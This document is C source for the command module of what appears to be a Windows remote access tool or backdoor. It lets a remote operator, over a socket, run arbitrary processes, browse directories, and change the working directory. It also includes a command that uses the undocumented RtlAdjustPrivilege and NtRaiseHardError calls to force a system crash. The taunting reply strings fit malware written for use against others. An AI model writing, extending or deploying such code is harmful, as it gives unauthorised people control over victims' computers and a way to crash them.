#include <string.h>
#include "Commands.h"
#include "SocketUtil.h"
#include "Utils.h"
#include "RemoteCommandExecutor.h"

static HANDLE processHeap = NULL;

//undocumented API
//declarations
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, 
								PULONG_PTR, ULONG, PULONG);

//
//Commands
//
BOOL HelpCommand(SOCKET* sck) {
	char buf[BUFSIZE];
	ZeroMemory(buf,BUFSIZE);
	
	for(int i = 0; strlen(buf) < BUFSIZE && i < N_COMMANDS; ++i) {
		strncat(buf, commands[i].command, strlen(commands[i].command));
		
		if(commands[i].needsArguments)
			strncat(buf, " [a]", 4);

		if(i < N_COMMANDS - 1)
			strncat(buf, ", ", 2);
	}

	WriteConnection(sck, buf);

	return TRUE;
}

BOOL HelloCommand(SOCKET* sck) {
	WriteConnection(sck, "i am still here dumbass...");

	return TRUE;
}

BOOL ReplyCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	WriteConnection(sck, str);

	return TRUE;
}

BOOL NtRaiseHardErrorCommand(SOCKET* sck) {
	WriteConnection(sck, "Goodbye my friend...");

	StopCommandExecutor();

	Sleep(3000);

    BOOLEAN bl;
	ULONG response;

    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	return TRUE;
}

BOOL ChangeDirectoryCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	if(!SetCurrentDirectory(str)) 
		WriteConnection(sck, "Could not change working directory");

	return TRUE;
}

BOOL GetCwdCommand(SOCKET* sck) {
	char fullPath[MAX_PATH];
	ZeroMemory(fullPath, MAX_PATH);
	GetCurrentDirectory(MAX_PATH, fullPath);

	WriteConnection(sck, fullPath);
	
	return TRUE;
}

BOOL CmdCommand(SOCKET* sck, PSTR str) {
	if(!strlen(str))
		return FALSE;

	DWORD timeout;
	char* commandBeginningPtr = GetCommandTimeout(str, &timeout);
	if(commandBeginningPtr == NULL) {
		WriteConnection(sck, "usage: cmd <timeout_ms_dec> [command...]");
		return FALSE;
	}

	SPAWNED_PROCESS_INFO process = SpawnNewProcess(commandBeginningPtr);
	
	if(process.isOk == FALSE) {
		int err = GetLastError();
		WriteConnection(sck, "Could not start new process");
		LPSTR message = ErrorString(err);
		WriteConnection(sck, message);
		LocalFree(message);
	} else {
		char msg[BUFSIZE];
		ZeroMemory(msg, BUFSIZE);
		snprintf(msg, BUFSIZE, "New process: %d\n", process.info.dwProcessId);
		WriteConnection(sck, msg);

		DWORD reasonCode = WaitForSingleObject(process.info.hProcess, timeout);
		
		char reason[51];
		ZeroMemory(reason, 51);
		memcpy(reason, "terminated, reason: ", 20);
		
		if(reasonCode == WAIT_FAILED)
			memcpy(reason + 20, "wait failure", 12);
		else if(reasonCode == WAIT_OBJECT_0)
			memcpy(reason + 20, "normal termination", 18);
		else if(reasonCode == WAIT_TIMEOUT)
			memcpy(reason + 20, "timeout reached", 15);
		else
			memcpy(reason + 20, "unknown", 7);

		DWORD exitCode = 0x0;
		GetExitCodeProcess(process.info.hProcess, &exitCode); 
		snprintf(reason + strlen(reason), 12, ": 0x%x", exitCode);

		WriteConnection(sck, reason);

		CloseHandle(process.stdOut);
		CloseHandle(process.stdIn);
		CloseHandle(process.stdErr);
		CloseHandle(process.info.hThread);
		CloseHandle(process.info.hProcess);
	}

	return TRUE;
}

BOOL ListDirectoryCommand(SOCKET* sock, PSTR str) {
	if(!processHeap)
		processHeap = GetProcessHeap();

	char* content;

	if (!strlen(str)) {
		char thisDirectory[4] = { '.', '\\', '*', 0 };
		content = GetDirectoryContent(processHeap, thisDirectory);
		WriteConnection(sock, content);
		HeapFree(processHeap, 0x0, content);
	}
	else {
		DWORD endPosForQuotedString;
		char* singleToken;
		char beforeListing[MAX_PATH + sizeof("DIRECTORY: ") + 1];
		const DWORD listingSize = MAX_PATH + sizeof("DIRECTORY: ") + 1;
		char thisDirectory[MAX_PATH];

		while ((singleToken = GetNextStringToken(str, &endPosForQuotedString))) {
			ZeroMemory(thisDirectory, MAX_PATH);
			memcpy(thisDirectory, singleToken, strlen(singleToken));
			PutAnyWildcardAtString(thisDirectory);

			content = GetDirectoryContent(processHeap, thisDirectory);
			ZeroMemory(beforeListing, listingSize);
			snprintf(beforeListing,
				listingSize,
				"DIRECTORY: %s\n", singleToken);
			WriteConnection(sock, beforeListing);
			WriteConnection(sock, content);
			HeapFree(processHeap, 0x0, content);
		}
	}

	return TRUE;
}
